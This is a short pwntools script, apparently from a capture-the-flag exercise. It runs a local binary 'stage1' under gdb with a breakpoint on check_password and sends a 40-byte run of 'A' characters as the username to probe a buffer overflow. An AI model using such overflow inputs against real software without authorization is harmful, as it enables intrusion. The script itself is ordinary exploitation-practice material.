#!/usr/bin/env python3

from pwn import *

elf = ELF("./stage1")

p = process(elf.path)

gdb.attach(p, '''
break check_password
continue
''')

print(p.recvline()) # welcome
print(p.recv(timeout=1)) # username
p.sendline(b"A"*(32+4+4))
print(p.recv(timeout=1)) # password
p.sendline(b"PPPP")
print(p.recvall())

